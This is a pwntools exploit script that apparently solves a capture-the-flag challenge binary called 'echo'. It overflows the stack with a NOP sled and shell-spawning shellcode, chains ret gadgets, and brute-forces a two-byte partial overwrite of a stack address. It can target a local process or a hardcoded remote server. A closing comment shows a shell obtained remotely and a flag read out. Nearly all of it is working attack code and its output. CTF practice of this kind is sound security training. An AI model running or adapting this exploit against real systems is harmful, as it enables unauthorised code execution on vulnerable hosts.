#!/usr/bin/env python
import random

from pwn import *

# WSL did not show the stack as rwx permissions
# used an Ubuntu 18.04 VM instead

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './echo'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("185.172.165.118", 9090)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
# echo: leave; ret
b * 0x401033
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Hand-crafted shellcode performs a read syscall to stack
# then a write syscall of the number of bytes read. After
# an input size of 392 bytes, program-counter is controlled
# after a ret.
# Keep returning until we overwrite 2-bytes of a stack address
# to redirect control flow to shellcode on the stack.

def attempt(loop=True):

    ii = 0
    while True:

        log.info(f"attempt: {ii}")

        io = start()

        shellcode = asm("sub rsp, 0x100")
        shellcode += asm(shellcraft.amd64.linux.sh())
        padding = b"\x90"*(392 - 8 - len(shellcode)) # nop-sled

        payload = padding
        payload += shellcode
        payload += b"B"*8 # rbp
        payload += p64(0x401034) # rip - ret
        payload += p64(0x401034) # rip - ret

        last = random.randint(0, 255)
        mid = random.randint(0, 255)
        payload += p8(last)
        payload += p8(mid) # 2-byte overwrite of stack address end

        log.info(f"Trying stack addr end: {hex(mid)} {hex(last)}")
        io.send(payload)
        echo = io.clean(0.5)
        #log.info(f"Echo = {echo}")

        try:
            io.sendline(b"id")
            response = io.clean(0.5)
            if len(response) > 0:
                log.success("Got shell")
                io.interactive()
            else:
                log.failure(f"attempt: {ii} failed - empty response")
                ii += 1
        except:
            log.failure(f"attempt: {ii} failed")
            ii += 1
            pass

        if not loop:
            io.interactive()
            break

        try:
            io.close()
        except:
            pass

loop = False

if args.LOOP:
    loop = True

attempt(loop)

"""
local exploit:
[*] attempt: 200
[+] Starting local process './echo': pid 19032
[*] Trying stack addr end: 0x55 0xe7
[+] Got shell
[*] Switching to interactive mode

remote exploit:
[*] attempt: 62
[+] Opening connection to 185.172.165.118 on port 9090: Done
[*] Trying stack addr end: 0x99 0x41
[+] Got shell
[*] Switching to interactive mode
$ ls
bin
dev
echo
etc
flag.txt
lib
lib32
lib64
libx32
usr
$ cat flag.txt
flag{a2e14ad30c012978fc870c1f529e8156}
"""
